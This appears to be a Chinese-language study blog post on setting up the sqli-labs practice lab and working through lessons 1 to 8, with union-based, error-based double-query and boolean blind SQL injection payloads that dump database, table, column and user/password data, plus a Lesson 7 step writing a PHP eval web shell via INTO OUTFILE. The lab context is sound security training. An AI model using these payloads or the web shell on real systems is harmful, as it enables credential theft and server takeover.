---
layout: page
title: "SQLi-labs环境搭建及学习"
date: 2019-10-12 01:01
---

## 环境搭建
- 花了好久才确定可以使用的php版本及mysql版本
- phpstudy `Apache2.4.39` `MySQL5.5.29` `php5.4.45`
- 将sqli-labs放到www 打开网址http://localhost/sqli-labs/ 点击Setup/reset Database for labs 安装即可

## SQL相关知识
SQL注释符
```
SQL注释符 		URL编码
#				%23
--空格			--%20 --+
/*...*/
```

SQL 查询信息
```
version() 		数据库版本信息
database()		数据库名称
user()			用户名
```

盲注(在不知道数据库返回值的情况下 对数据中的内容进行猜测)
```
盲注
布尔盲注：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据

基于时间的盲注：通过页面沉睡时间判断

报错的盲注：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）
```

## Lesson 1 GET-Error based-Single quotes-String
基于错误-单引号-字符注入

- 判断是否为数值注入
id=1 成功回显数据
id=1 and 1=1 成功回显数据
id=1 and 1=2 成功回显数据
所以不是数值注入

- 判断是否为字符注入
id=1' 报错
id=1'--+ 成功回显
是字符注入

- 查找字段
id=1' order by 5--+ 回显` Unknown column '5' in 'order clause'`
id=1' order by 3--+ 成功回显 字段为3

- 查询回显点
id=' union select 1,2,3--+ 回显`Your Login name:2 Your Password:3`说明第二第三字段会显示

- 查询数据库相关信息
id=' union select 1,database(),user()--+ 回显`Your Login name:security Your Password:root@localhost`
id=' union select 1,2,version()--+ 回显` Your Login name:2 Your Password:5.5.29 `

- 查询所有数据库
id=' union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+ 回显`Your Login name:information_schema,challenges,mysql,performance_schema,security,test Your Password:3`

- 查询security数据库的表名
id=' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+ 回显`Your Login name:emails,referers,uagents,users Your Password:3`

- 查询users表中的列名
id=' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+ 回显` Your Login name:id,username,password Your Password:3 `

- 查询两个列的数据username与password
id=' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+
回显` Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4`

## Lesson 2 GET-Error based-Intiger based
基于错误的数值注入
- 判断是否为数值注入
id=1 成功回显数据
id=1 and 1=1 成功回显数据
id=1 and 1=2 成功执行没有回显数据

- 查找字段
id=1 order by 3--+

- 查询回显点
id=0 union select 1,2,3--+ 回显` Your Login name:2 Your Password:3` 后两个字段回显

- 查询数据库相关信息 
id=0 union select 1,database(),version()--+
id=0 union select 1,database(),user()--+

- 查询所有数据库 
id=0 union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+ 
- 查询数据库表名
id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+ 
- 查询users表中的列名
id=0 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+ 
- 查询两个列的数据username与password
id=0 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+

## Lesson 3 GET-Error based-Single quotes with twist-string
基于GET错误-单引号变形-字符
- id=1' 报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ' `'1'')` LIMIT 0,1' at line 1
- 猜测id除了有单引号`''` 还有`()`
`select * from tablename where id=(' ')`
- id=1') and 1=1--+ 成功回显

## Lesson 4 GET-Error based-Double Quotes-String
基于错误-双引号-字符
- id=1'  一个单引号竟然成功回显了 
  id=1'' 两个单引号竟然成功回显了 好吧1'''被当作1执行了
- id=1"  报错for the right syntax to use near ' `"3"")` LIMIT 0,1' at line 1
- 猜测`select * from tablename where id=(" ")`
- id=1") and 1=1--+ 成功回显

## `Lesson 5 GET-Double Injection-Single Quotes-String`
GET-双注入-单引号-字符
双注入用到的函数/语句
```
Rand()          随机函数
Floor()         取整函数
Count()         汇总函数
Group by clause 分组语句
```
- id=2' and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
这里使用了派生表`select 1 from a` 回显 `Subquery returns more than 1 row` 实际上这条SQL语句返回一个row 只是字符串长度超过了64位 
- 使用limit 0,1来控制一个个输出 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 回显`Duplicate entry 'information_schema1' for key 'group_key'`
但是为了使数据输出更清楚 构造语句让报错信息与固定系统语句信息分离 ?id=2' and (select 1 from (select count(*),concat(((select concat(schema_name,';') from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 回显`Duplicate entry 'information_schema;1' for key 'group_key'` 其中information_schema为真正报错信息为数据库名称
- ?id=2' and (select 1 from (select count(*),concat(((select concat(table_name,';') from information_schema.tables limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 回显` Duplicate entry 'CHARACTER_SETS;1' for key 'group_key'`

## Lesson 6 GET-Double Injection-Double Quotes-String
GET-双注入-双引号-字符串
- 同lesson5 单引号变双引号

## Lesson 7 GET-Dump into outfile-String
GET-导出文件-字符型
- id=1 回显`You are in.... Use outfile......`
- 判断数值注入 id=1 and 1=2 还是回显`You are in.... Use outfile......`不是数值注入
- 判断字符注入 id=1' 回显` You have an error in your SQL syntax `有戏
  id=1'--+   回显` You have an error in your SQL syntax `
  id=1')--+  回显` You have an error in your SQL syntax `
  id=1'))--+ 回显` You are in.... Use outfile......`

- 如果已经绝对路径 可以写入文件 ?id=1')) union select "<?php @eval($_POST['topo']);?>" into outfile "XXX\conn.php" %23 再用蚁剑连接

## Lesson 8 GET-Blind-Boolian Based-Single Quotes
GET-盲注-基于布尔-单引号
- ?id=1 回显`You are in...........`
  id=0  成功执行无回显

- id=1' 成功执行无回显
  id=1'%23 成功执行有回显``You are in...........`
  ?id=1'and 1=2%23 成功执行无回显
  ?id=1'and 1=1%23 成功执行有回显`You are in...........`

布尔盲注 成功查询到数据返回true 错误及无数据返回false 